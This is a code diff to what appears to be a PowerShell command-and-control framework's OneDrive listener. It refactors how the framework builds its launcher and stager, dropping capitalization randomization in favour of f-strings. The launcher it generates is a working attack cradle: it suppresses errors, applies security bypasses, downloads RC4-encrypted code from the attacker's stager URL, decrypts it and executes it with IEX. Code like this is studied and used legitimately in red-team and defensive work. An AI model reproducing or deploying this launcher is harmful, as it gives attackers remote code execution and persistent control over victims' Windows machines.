@@ -237,89 +237,60 @@ class Listener(object):
                 launcher = "$ErrorActionPreference = 'SilentlyContinue';"  # Set as empty string for debugging
 
                 if safeChecks.lower() == "true":
-                    launcher = helpers.randomize_capitalization(
-                        "If($PSVersionTable.PSVersion.Major -ge 3){"
-                    )
+                    launcher = "If($PSVersionTable.PSVersion.Major -ge 3){"
+
                     for bypass in bypasses:
                         launcher += bypass
-                    launcher += "};"
-                    launcher += helpers.randomize_capitalization(
-                        "[System.Net.ServicePointManager]::Expect100Continue=0;"
+                    launcher += (
+                        "};[System.Net.ServicePointManager]::Expect100Continue=0;"
                     )
 
-                launcher += helpers.randomize_capitalization(
-                    "$wc=New-Object SYstem.Net.WebClient;"
-                )
+                launcher += "$wc=New-Object SYstem.Net.WebClient;"
 
                 if userAgent.lower() == "default":
                     profile = listener_options["DefaultProfile"]["Value"]
                     userAgent = profile.split("|")[1]
-                launcher += "$u='" + userAgent + "';"
+                launcher += f"$u='{ userAgent }';"
 
                 if userAgent.lower() != "none" or proxy.lower() != "none":
                     if userAgent.lower() != "none":
-                        launcher += helpers.randomize_capitalization("$wc.Headers.Add(")
-                        launcher += "'User-Agent',$u);"
+                        launcher += "$wc.Headers.Add('User-Agent',$u);"
 
                     if proxy.lower() != "none":
                         if proxy.lower() == "default":
-                            launcher += helpers.randomize_capitalization(
+                            launcher += (
                                 "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                             )
+
                         else:
-                            launcher += helpers.randomize_capitalization(
-                                "$proxy=New-Object Net.WebProxy;"
-                            )
-                            launcher += helpers.randomize_capitalization(
-                                "$proxy.Address = '" + proxy.lower() + "';"
-                            )
-                            launcher += helpers.randomize_capitalization(
-                                "$wc.Proxy = $proxy;"
-                            )
+                            launcher += "$proxy=New-Object Net.WebProxy;"
+                            launcher += f"$proxy.Address = '{ proxy.lower() }';"
+                            launcher += "$wc.Proxy = $proxy;"
+
                     if proxyCreds.lower() == "default":
-                        launcher += helpers.randomize_capitalization(
-                            "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
-                        )
+                        launcher += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
+
                     else:
                         username = proxyCreds.split(":")[0]
                         password = proxyCreds.split(":")[1]
                         domain = username.split("\\")[0]
                         usr = username.split("\\")[1]
-                        launcher += (
-                            "$netcred = New-Object System.Net.NetworkCredential('"
-                            + usr
-                            + "','"
-                            + password
-                            + "','"
-                            + domain
-                            + "');"
-                        )
-                        launcher += helpers.randomize_capitalization(
-                            "$wc.Proxy.Credentials = $netcred;"
-                        )
+                        launcher += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
+                        launcher += "$wc.Proxy.Credentials = $netcred;"
 
                     launcher += "$Script:Proxy = $wc.Proxy;"
 
                 # code to turn the key string into a byte array
-                launcher += helpers.randomize_capitalization(
-                    "$K=[System.Text.Encoding]::ASCII.GetBytes("
+                launcher += (
+                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
                 )
-                launcher += "'%s');" % staging_key
 
                 # this is the minimized RC4 launcher code from rc4.ps1
-                launcher += helpers.randomize_capitalization(
-                    "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
-                )
+                launcher += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
 
-                launcher += helpers.randomize_capitalization("$data=$wc.DownloadData('")
-                launcher += self.stager_url
-                launcher += helpers.randomize_capitalization(
-                    "');$iv=$data[0..3];$data=$data[4..$data.length];"
-                )
-
-                launcher += helpers.randomize_capitalization(
-                    "-join[Char[]](& $R $data ($IV+$K))|IEX"
-                )
+                launcher += f"$data=$wc.DownloadData('{self.stager_url}');"
+                launcher += "$iv=$data[0..3];$data=$data[4..$data.length];"
+                launcher += "-join[Char[]](& $R $data ($IV+$K))|IEX"
 
                 if obfuscate:
                     launcher = data_util.obfuscate(
@@ -389,27 +360,23 @@ class Listener(object):
             if working_hours != "":
                 stager = stager.replace("REPLACE_WORKING_HOURS", working_hours)
 
-            randomized_stager = ""
-
+            unobfuscated_stager = ""
             for line in stager.split("\n"):
                 line = line.strip()
-
+                # skip commented line
                 if not line.startswith("#"):
-                    if '"' not in line:
-                        randomized_stager += helpers.randomize_capitalization(line)
-                    else:
-                        randomized_stager += line
+                    unobfuscated_stager += line
 
             if encode:
-                return helpers.enc_powershell(randomized_stager)
+                return helpers.enc_powershell(unobfuscated_stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
                 staging_key = staging_key.encode("UTF-8")
                 return RC4IV + encryption.rc4(
-                    RC4IV + staging_key, randomized_stager.encode("UTF-8")
+                    RC4IV + staging_key, unobfuscated_stager.encode("UTF-8")
                 )
             else:
-                return randomized_stager
+                return unobfuscated_stager
 
         else:
             print(helpers.color("[!] Python agent not available for Onedrive"))
